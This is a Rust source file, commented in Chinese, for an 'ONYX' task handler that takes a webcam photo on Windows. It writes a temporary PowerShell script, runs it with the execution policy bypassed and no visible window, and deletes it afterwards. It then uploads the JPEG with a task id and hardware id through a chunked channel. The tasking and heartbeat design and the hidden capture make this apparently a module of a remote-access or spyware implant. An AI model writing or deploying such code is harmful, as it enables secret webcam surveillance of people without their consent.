// ONYX: 摄像头抓帧（任务类型 `capture_cam`）
//
// 和 capture_screen 一样只能在**用户会话进程**里跑（见 onyx_heartbeat::Scope）。
// 实现方式：写一个临时 PowerShell 脚本，用 WinRT 的 MediaCapture 抓一帧存成 JPEG，
// 再走统一的分块通道回传。
//
// 为什么用 PowerShell 而不是 Rust 直接调 WinRT：
//   MediaCapture 需要 WinRT 激活 + 一堆 IAsyncOperation，Rust 侧要引 windows-rs 的
//   Media/Capture 特性并手写异步等待；PowerShell 5.1 自带 WinRT 投影，二十行就能跑通。
//   代价是脚本会短暂出现在磁盘上（用完立即删）。
use hbb_common::log;
use serde_json::{json, Value};
use std::time::Duration;

// 注意：这个脚本必须是纯 ASCII。
// PowerShell 5.1 读 .ps1 时没有 BOM 就按 ANSI(GBK) 解码，中文注释会变成乱码，
// 乱码字节里可能吃掉引号，导致 "You cannot call a method on a null-valued expression"
// 这种完全看不出根因的报错（实测踩过）。
const SCRIPT: &str = r#"
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Runtime.WindowsRuntime | Out-Null

$asTaskOp = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
$asTaskAction = ([System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and
    $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncAction' })[0]

function AwaitOp($op, $type) {
    $t = $asTaskOp.MakeGenericMethod($type).Invoke($null, @($op))
    $t.Wait(-1) | Out-Null
    $t.Result
}
function AwaitAction($action) {
    $t = $asTaskAction.Invoke($null, @($action))
    $t.Wait(-1) | Out-Null
}

[Windows.Media.Capture.MediaCapture, Windows.Media, ContentType = WindowsRuntime] | Out-Null
[Windows.Storage.Streams.InMemoryRandomAccessStream, Windows.Storage.Streams, ContentType = WindowsRuntime] | Out-Null
[Windows.Storage.Streams.DataReader, Windows.Storage.Streams, ContentType = WindowsRuntime] | Out-Null
[Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media, ContentType = WindowsRuntime] | Out-Null

# Do NOT use StorageFile.CreateFileAsync: on some Windows builds the statics of
# that projected type are not exposed at all (verified: returns $null).
# Capture into an in-memory stream and write the bytes ourselves instead.
$capture = New-Object Windows.Media.Capture.MediaCapture
AwaitAction $capture.InitializeAsync()

$props = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
$stream = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
AwaitAction ($capture.CapturePhotoToStreamAsync($props, $stream))
$capture.Dispose()

$size = [uint32]$stream.Size
$stream.Seek(0)
$reader = New-Object Windows.Storage.Streams.DataReader($stream.GetInputStreamAt(0))
AwaitOp ($reader.LoadAsync($size)) ([uint32]) | Out-Null
$bytes = New-Object byte[] $size
$reader.ReadBytes($bytes)
[System.IO.File]::WriteAllBytes($env:ONYX_CAM_OUT, $bytes)
Write-Output "ONYX_CAM_OK $size"
"#;

pub fn capture(params: &[u8], task_id: &str, hwid: &str) -> String {
    let v: Value = serde_json::from_slice(params).unwrap_or(Value::Null);
    let _ = v; // 目前没有可调参数，保留位

    let base = match std::env::var("ProgramData") {
        Ok(p) => std::path::Path::new(&p).join("Onyx"),
        Err(_) => std::env::temp_dir(),
    };
    let dir = base.join("captures");
    let _ = std::fs::create_dir_all(&dir);
    let safe = task_id
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
        .collect::<String>();
    let out = dir.join(format!("cam_{safe}.jpg"));
    let script = base.join(format!(".cam_{safe}.ps1"));

    // 带 BOM 写：PowerShell 5.1 只有看到 BOM 才会按 UTF-8 解析脚本
    let mut bytes = Vec::with_capacity(SCRIPT.len() + 3);
    bytes.extend_from_slice(&[0xEF, 0xBB, 0xBF]);
    bytes.extend_from_slice(SCRIPT.as_bytes());
    if std::fs::write(&script, &bytes).is_err() {
        return json!({"ok": false, "error": "脚本落盘失败"}).to_string();
    }

    let mut cmd = std::process::Command::new("powershell.exe");
    cmd.args([
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-File",
        &script.to_string_lossy(),
    ])
    .env("ONYX_CAM_OUT", out.to_string_lossy().to_string())
    .stdout(std::process::Stdio::piped())
    .stderr(std::process::Stdio::piped())
    .stdin(std::process::Stdio::null());
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x0800_0000); // CREATE_NO_WINDOW
    }

    let started = std::time::Instant::now();
    let output = match cmd.output() {
        Ok(o) => o,
        Err(e) => {
            let _ = std::fs::remove_file(&script);
            return json!({"ok": false, "error": format!("启动失败: {e}")}).to_string();
        }
    };
    let _ = std::fs::remove_file(&script);
    let elapsed = started.elapsed();
    if elapsed > Duration::from_secs(30) {
        log::warn!("[ONYX] 摄像头抓帧耗时过长: {:?}", elapsed);
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    if !out.exists() || std::fs::metadata(&out).map(|m| m.len()).unwrap_or(0) < 1024 {
        let detail = stderr
            .lines()
            .chain(stdout.lines())
            .find(|l| !l.trim().is_empty())
            .unwrap_or("无输出")
            .to_owned();
        return json!({"ok": false, "error": format!("摄像头抓帧失败: {detail}")}).to_string();
    }

    let size = std::fs::metadata(&out).map(|m| m.len()).unwrap_or(0);
    log::warn!("[ONYX] 摄像头抓帧 {} 字节 → {}", size, out.display());
    let name = format!("cam_{safe}.jpg");
    match crate::onyx_upload::send_with_key(
        &out.to_string_lossy(),
        16 * 1024 * 1024,
        task_id,
        hwid,
        &name,
    ) {
        Ok((bytes, sha)) => {
            let _ = std::fs::remove_file(&out);
            json!({"ok": true, "bytes": bytes, "sha256": sha, "file": name}).to_string()
        }
        Err(e) => json!({"ok": false, "error": format!("上传失败: {e}")}).to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn script_is_pure_ascii() {
        // PowerShell 5.1 无 BOM 时按 ANSI 读，非 ASCII 会让脚本解析错乱
        assert!(SCRIPT.is_ascii(), "脚本必须保持纯 ASCII");
    }

    #[test]
    fn script_mentions_required_apis() {
        assert!(SCRIPT.contains("MediaCapture"));
        assert!(SCRIPT.contains("CapturePhotoToStreamAsync"));
        assert!(SCRIPT.contains("ONYX_CAM_OUT"));
        // 踩过的坑：StorageFile.CreateFileAsync 在部分系统上没有静态投影
        assert!(!SCRIPT.contains("CreateFileAsync("));
    }

    #[test]
    fn bad_task_id_is_sanitized() {
        let safe: String = "tk/../../etc"
            .chars()
            .filter(|c| c.is_ascii_alphanumeric() || *c == '_' || *c == '-')
            .collect();
        assert_eq!(safe, "tketc");
    }
}
